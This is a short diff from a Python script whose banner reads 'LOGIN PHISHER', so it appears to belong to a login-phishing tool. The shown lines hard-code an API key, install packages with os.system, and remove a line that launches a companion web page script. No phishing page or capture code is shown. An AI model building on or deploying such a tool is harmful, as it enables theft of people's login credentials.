@@ -9,7 +9,6 @@ IPINFO_API_KEY = "5f8ea1c410083a"
 os.system("pip install flask")
 os.system("apt install git")
 os.system("clear")
-os.system("python weboldal.py")
 
 print("\033[34m██╗      ██████╗  ██████╗ ██╗███╗   ██╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ ")
 print("██║     ██╔═══██╗██╔════╝ ██║████╗  ██║    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗")
